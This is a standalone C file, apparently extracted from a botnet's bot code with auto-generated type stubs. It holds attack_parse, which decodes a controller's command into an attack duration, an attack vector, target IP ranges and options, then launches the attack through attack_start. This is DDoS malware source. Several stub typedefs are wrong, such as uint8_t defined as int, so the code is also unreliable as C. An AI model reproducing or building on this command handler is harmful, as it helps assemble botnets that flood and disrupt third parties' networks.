#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int uint8_t ;
typedef  int /*<<< orphan*/  uint32_t ;
struct TYPE_3__ {int /*<<< orphan*/  s_addr; } ;
struct TYPE_4__ {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct attack_target {int netmask; int /*<<< orphan*/  addr; TYPE_2__ sock_addr; } ;
struct attack_option {int key; void* val; } ;
typedef  int /*<<< orphan*/  ipv4_t ;
typedef  scalar_t__ ATTACK_VECTOR ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  attack_start (int /*<<< orphan*/ ,scalar_t__,int,struct attack_target*,int,struct attack_option*) ; 
 void* calloc (int,int) ; 
 scalar_t__ errno ; 
 int /*<<< orphan*/  free (struct attack_target*) ; 
 int /*<<< orphan*/  free_opts (struct attack_option*,int) ; 
 int /*<<< orphan*/  ntohl (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  util_memcpy (void*,char*,int) ; 

void attack_parse(char *buf, int len)
{
    int i;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    // Read in attack duration uint32_t
    if (len < sizeof (uint32_t))
        goto cleanup;
    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof (uint32_t);
    len -= sizeof (uint32_t);

    // Read in attack ID uint8_t
    if (len == 0)
        goto cleanup;
    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof (uint8_t);

    // Read in target count uint8_t
    if (len == 0)
        goto cleanup;
    targs_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);
    if (targs_len == 0)
        goto cleanup;

    // Read in all targs
    if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
        goto cleanup;
    targs = calloc(targs_len, sizeof (struct attack_target));
    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof (ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof (ipv4_t) + sizeof (uint8_t));

        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }

    // Read in flag count uint8_t
    if (len < sizeof (uint8_t))
        goto cleanup;
    opts_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);

    // Read in all opts
    if (opts_len > 0)
    {
        opts = calloc(opts_len, sizeof (struct attack_option));
        for (i = 0; i < opts_len; i++)
        {
            uint8_t val_len;

            // Read in key uint8
            if (len < sizeof (uint8_t))
                goto cleanup;
            opts[i].key = (uint8_t)*buf++;
            len -= sizeof (uint8_t);

            // Read in data length uint8
            if (len < sizeof (uint8_t))
                goto cleanup;
            val_len = (uint8_t)*buf++;
            len -= sizeof (uint8_t);

            if (len < val_len)
                goto cleanup;
            opts[i].val = calloc(val_len + 1, sizeof (char));
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }

    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);

    // Cleanup
    cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        free_opts(opts, opts_len);
}